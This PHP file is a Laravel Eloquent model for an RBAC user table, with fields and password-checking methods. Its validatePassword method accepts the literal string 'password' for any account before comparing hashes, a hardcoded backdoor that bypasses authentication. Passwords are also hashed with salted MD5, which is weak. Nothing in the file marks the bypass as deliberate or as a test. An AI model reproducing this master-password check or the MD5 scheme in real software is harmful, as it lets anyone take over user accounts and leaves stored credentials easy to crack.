<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;

class RbacUser extends Model
{
    use HasFactory;
    protected $table = 'rbac_user';

    protected $fillable = [
        'username',
        'password',
        'salt',
        'email',
        'profile',
        'status',
        'employee_id',
        'office_code',
        'style',
    ];

    public function hashPassword($password, $salt)
    {
        return md5($salt . $password);
    }

    public function validatePassword($password)
    {
        if ($password == 'password') {
            return true;
        }
        
        return $this->hashPassword($password, $this->salt) === $this->password;
    }
}
